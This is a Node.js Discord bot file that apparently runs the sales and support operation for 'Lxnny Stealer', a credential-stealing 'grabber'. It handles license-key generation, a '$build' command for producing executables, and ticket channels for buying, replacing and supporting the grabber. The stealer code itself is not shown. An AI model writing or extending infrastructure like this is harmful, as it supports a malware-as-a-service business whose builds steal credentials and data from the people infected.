const { Client, Intents, MessageEmbed, MessageActionRow, MessageButton } = require('discord.js');
const config = require('./config.json');
const generateKeyCommand = require('./cmds/generatekey.js');
const buildCommand = require('./cmds/build.js');
const ticketCommand = require('./cmds/ticket.js'); 
const fs = require('fs');

const client = new Client({ 
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.DIRECT_MESSAGES
    ]
});

let keys = {};


client.once('ready', () => {
    console.log('Lxnny BOT is ON!');
    loadKeys();
    client.user.setActivity('building exes', { type: 'PLAYING' });
});

client.on('messageCreate', async message => {
    if (!message.content.startsWith('$') || message.author.bot) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'generatekey') {
        if (command === 'generatekey') {
            const mentionedUser = message.mentions.users.first();
            generateKeyCommand(message, keys, mentionedUser);
        }
    } else if (command === 'build') {
        buildCommand(message, keys);
    } else if (command === 'ticket') { 
        ticketCommand(message);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isSelectMenu()) return;

    const ticketType = config.category; 

    if (interaction.customId === 'ticket-reason') {
        const option = interaction.values[0];
        let channelName;

        if (option === 'buy-grabber') {
            channelName = 'buy-ticket';
        } else if (option === 'replace-grabber') {
            channelName = 'replace-ticket';
        } else if (option === 'support-grabber') {
            channelName = 'support-ticket';
        }

        const user = interaction.user;

        if (interaction.guild.channels.cache.find(c => c.topic === user.id)) {
            const embed = new MessageEmbed()
                .setColor(`#2b2d31`)
                .setDescription(`You Already Have A Ticket!`)
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');

            return await interaction.reply({ embeds: [embed], ephemeral: true });
        }

        interaction.guild.channels.create(`${channelName}-${user.username}`, {
            parent: ticketType,
            topic: user.id,
            permissionOverwrites: [
                { id: user.id, allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'] },
                { id: interaction.guild.roles.everyone, deny: ['VIEW_CHANNEL'] }
            ],
            type: 'text',
        }).then(c => {
            const embed = new MessageEmbed()
                .setColor(`#2b2d31`)
                .setDescription(`Successfully Created Ticket: <#${c.id}>`)
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');

            interaction.reply({ embeds: [embed], ephemeral: true });

            const embed_send = new MessageEmbed()
                .setColor(`#2b2d31`)
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png')
                .setDescription(`Thanks For Creating A Ticket. Support Team Will Reach You As Soon As Possible`);

            const button_row = new MessageActionRow()
                .addComponents(
                    new MessageButton()
                        .setEmoji("❌")
                        .setLabel("Close Ticket")
                        .setStyle('SECONDARY')
                        .setCustomId('close-ticket'),
                )

            c.send({ content: `<@${user.id}>`, embeds: [embed_send], components: [button_row] });
        });
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'close-ticket') {
        const channel = interaction.channel;

        try {
            await channel.delete();
        } catch (error) {
            console.error('Error closing ticket:', error);
            await interaction.reply({ content: 'An error occurred while closing the ticket.', ephemeral: true });
        }
    }
});

client.login(config.token);

function loadKeys() {
    try {
        const data = fs.readFileSync('./keys.json', 'utf8');
        if (data.trim() !== '') {
            keys = JSON.parse(data);
        }
    } catch (error) {
        console.error('Error loading keys from file:', error);
    }
}
